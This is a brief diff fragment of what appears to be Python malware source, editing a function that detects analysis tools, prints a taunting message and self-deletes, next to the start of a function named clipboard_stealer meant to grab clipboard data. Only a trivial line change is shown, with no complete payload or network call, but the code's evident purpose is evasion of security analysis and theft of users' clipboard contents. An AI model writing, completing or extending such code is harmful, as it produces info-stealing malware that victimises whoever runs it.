@@ -49,7 +49,7 @@ def is_app_installed():
            print("Analysis application installation found, goodbye")
            self_delete() 
         else:
-            a="1"
+            return None
 
 def clipboard_stealer():
 #get clipboard data
